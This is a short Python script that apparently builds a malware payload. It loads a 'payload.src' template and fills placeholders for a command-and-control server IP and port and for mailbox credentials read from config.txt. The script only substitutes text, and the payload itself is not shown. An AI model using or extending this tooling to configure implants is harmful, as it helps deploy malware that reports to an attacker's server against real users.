import sys
import os
import re

source_directory = os.path.join(os.path.dirname(__file__), "..")

sources = ["payload.src"]

config = None
contents = ""
lines = []
for file in sources:
	with open( os.path.join(source_directory, file), "rt") as f:
		contents = contents + "\n" + f.read()

with open( "config.txt", "r") as f:
	config = f.readlines()

# In config.txt first row: IP PORT
ip = config[0].split()[0]
port = config[0].split()[1]
email = config[1].split()[0]
passwd = config[1].split()[1]
print(contents.replace("__CC_SERVER_IP_ADDRESS__", ip).replace("__CC_SERVER_PORT_NUMBER__", port).replace("__MAILBOX_USERNAME__", email).replace("__MAILBOX_PASSWORD__", passwd))